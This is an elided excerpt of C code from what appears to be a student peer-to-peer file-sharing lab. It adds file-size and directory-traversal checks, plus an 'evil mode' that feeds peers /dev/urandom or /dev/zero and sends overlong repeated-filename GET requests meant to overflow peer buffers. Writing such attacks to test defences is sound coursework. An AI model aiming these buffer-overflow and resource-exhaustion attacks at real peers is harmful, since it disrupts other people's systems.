...
#define MAX_FILE_SIZE 2147483648 //Maximum file size: 2 GB
...
* Try 'rm %s.~*~' to remove them.\n", t->filename, t->filename);
	...
	while (1) {
		...
		//Check if peer has written more than our maximum file 
		//size, and stop it if it has
		if (t->total_written > MAX_FILE_SIZE) {
			error("Exceeded maximum file size. Exiting.");
			goto try_again;
		}
...
static void task_upload(task_t *t)
{
	...
	//Before uploading the file, we can check for various stuffs
	//Check if the file is in the current directory
	char fileDirBuffer[PATH_MAX+1];
	char curDirBuffer[PATH_MAX+1];
	char *curDir = getcwd(curDirBuffer, PATH_MAX+1);
	char *fileDir = realpath(t->filename, fileDirBuffer);

	if (strncmp(curDir, fileDir, strlen(curDir))) {
		errno = ENOENT;
		error("Tried to access file outside directory. Exiting.\n");
		goto exit;
	}
	...
	if (evil_mode) {
		switch(rand() % 2) { //can randomly choose between several attacks. Makes it easy to add more if we become more evil in the future
			case 0:
				strncpy(t->filename, "/dev/urandom", FILENAMESIZ); //Put random characters into filename
				break;
			case 1:
				strncpy(t->filename, "/dev/zero", FILENAMESIZ); //Put zero bytes into the filename
		}
	}
...
static void doEvil(task_t *t, task_t *tracker_task) {
	//First check if there are any peers to victimize
	if (t == NULL || t->peer_list == NULL) {
		error("No victi-- er, I mean peers");
		task_free(t);
		return;
	}
	//Make sure we aren't attacking ourselves
		...
		goto try_again;
	//Get a filename that's not null terminated
	strncpy(t->filename, t->disk_filename, FILENAMESIZ-1);
	//write that filename many times to the peer's download
	osp2p_writef(t->peer_fd, "GET %s%s%s%s%s%s OSP2P\n", t->filename, t->filename, t->filename, t->filename, t->filename, t->filename);

	try_again:
	//Might as well keep trying to mess things up, so just call this same function again
	task_pop_peer(t);
	doEvil(t, tracker_task);
}
...
"         -b[MODE]     Evil mode!!!!!!!!\n");
	...
	if (evil_mode) {
		strcpy((--argv)[0], "cat1.jpg");
		task_t *t = start_download(tracker_task, argv[1]);
		if (t == NULL) {
			error("Download attack failed. Must resort to other evil plans");
		}
		else {
			pid_t pid = fork();
			if (pid > 0) {
